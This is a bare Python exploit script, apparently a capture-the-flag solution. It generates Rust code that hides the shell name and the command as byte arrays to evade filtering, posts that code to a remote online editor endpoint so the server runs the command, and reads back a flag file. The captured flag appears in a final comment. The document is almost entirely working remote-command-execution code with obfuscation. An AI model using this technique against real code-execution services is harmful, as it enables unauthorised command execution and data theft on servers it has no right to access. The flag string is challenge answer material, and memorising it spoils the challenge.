s="""
use std::process::Command;

fn main() {
let a = vec![115, 104];
let b = String::from_utf8(a).unwrap();

let c = vec!%s;
let d = String::from_utf8(c).unwrap();

let output = Command::new(b)
.arg("-c").arg(d).output().expect("fail");

println!("stdout: {}", String::from_utf8_lossy(&output.stdout));
}
"""

def craft(cmd):
    k = [ord(x) for x in cmd]
    k = str(k)

    return s % k

from requests import post
import re

def cmd(cmds):
    url = "http://34.89.159.150:32610/editor"
    r = post(url, data = {
        "codename": craft(cmds)
        })
    text = r.text
    k = re.findall("Output: '.*';", text, re.S)[0]
    print (k)

print (cmd("cat /flag39283761/flag2781263 "))
# CTF{c7d604ecd0da6804f45d958b4c5fb622488250bd05c29b99d0134f3bfdda2fc4}
